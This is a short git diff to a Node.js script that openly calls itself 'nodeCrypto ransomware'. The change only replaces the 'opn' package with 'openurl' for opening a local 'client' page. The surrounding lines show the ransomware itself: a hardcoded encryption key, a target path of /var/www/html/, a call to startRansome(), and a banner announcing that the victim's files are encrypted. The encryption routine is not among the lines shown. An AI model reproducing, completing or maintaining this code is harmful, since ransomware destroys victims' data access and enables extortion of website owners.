@@ -4,7 +4,6 @@ const fs = require('fs');
 const path = require('path');
 const Cryptr = require('cryptr');
 const boxen = require('boxen');
-var opn = require('opn');
 // Editable variables
 const privateKey = 'myTotalySecretKey';
 const websitePath = '/var/www/html/';
@@ -105,6 +104,6 @@ fs.stat('config.json', function(err) {
 		startRansome();
 		console.log(boxen('Your files are encrypted by nodeCrypto ransomware!', {padding: 1, margin: 1, borderStyle: 'double', borderColor: 'red'}));
 		if(openReward)
-			opn('http://localhost/client/');
+			require("openurl").open("http://localhost/client/");
     }
 });
